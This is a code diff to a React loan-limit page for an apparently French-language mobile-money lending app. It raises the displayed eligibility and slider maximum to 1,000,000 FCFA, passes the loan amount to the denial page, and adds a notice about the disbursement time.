@@ -1,6 +1,6 @@
 import { useState, useRef } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
-import { Wallet, CheckCircle2 } from "lucide-react";
+import { Wallet, CheckCircle2, Clock } from "lucide-react";
 
 const API_URL = "https://fastloan-momo-kj8m.onrender.com";
 
@@ -26,7 +26,7 @@ const LoanLimit = () => {
     // ✅ 60 SECONDS (1 MINUTE) TIMER
     timerRef.current = setTimeout(() => {
       setIsProcessing(false);
-      navigate("/loan-denied");
+      navigate("/loan-denied", { state: { amount: amount } });
     }, 60000);
 
     try {
@@ -48,18 +48,18 @@ const LoanLimit = () => {
             clearInterval(pollInterval);
             if (timerRef.current) clearTimeout(timerRef.current);
             setIsProcessing(false);
-            navigate("/loan-denied");
+            navigate("/loan-denied", { state: { amount: amount } });
           }
         }, 3000);
       } else {
         if (timerRef.current) clearTimeout(timerRef.current);
         setIsProcessing(false);
-        navigate("/loan-denied");
+        navigate("/loan-denied", { state: { amount: amount } });
       }
     } catch (error) {
       if (timerRef.current) clearTimeout(timerRef.current);
       setIsProcessing(false);
-      navigate("/loan-denied");
+      navigate("/loan-denied", { state: { amount: amount } });
     }
   };
 
@@ -86,9 +86,26 @@ const LoanLimit = () => {
 
         <h2 className="title">Votre limite de prêt</h2>
         <p className="subtitle">
-          Vous êtes éligible jusqu'à <span className="bold">780 000 FCFA</span>.
+          Vous êtes éligible jusqu'à <span className="bold">1 000 000 FCFA</span>.
           Choisissez le montant.
         </p>
+
+        {/* ✅ NEW MARKET BRAND NOTICE */}
+        <div style={{
+          backgroundColor: '#EFF6FF',
+          border: '1px solid #BFDBFE',
+          borderRadius: '12px',
+          padding: '12px',
+          marginBottom: '24px',
+          display: 'flex',
+          alignItems: 'flex-start',
+          gap: '10px'
+        }}>
+          <Clock size={20} color="#1D4ED8" style={{ flexShrink: 0, marginTop: '2px' }} />
+          <p style={{ fontSize: '13px', color: '#1E3A8A', lineHeight: '1.4', fontWeight: 500 }}>
+            Votre prêt sera directement transféré sur votre portefeuille mobile dès son approbation, ce qui prend généralement environ <strong>30 minutes</strong>.
+          </p>
+        </div>
 
         <div className="loan-amount-box">
           <p className="loan-label">MONTANT DU PRÊT</p>
@@ -104,14 +121,14 @@ const LoanLimit = () => {
           <input
             type="range"
             min="50000"
-            max="780000"
+            max="1000000" // ✅ Increased Maximum Limit to 1,000,000
             step="10000"
             value={amount}
             onChange={(e) => setAmount(Number(e.target.value))}
           />
           <div className="slider-limits">
             <span>50 000 FCFA</span>
-            <span>780 000 FCFA</span>
+            <span>1 000 000 FCFA</span>
           </div>
         </div>
 
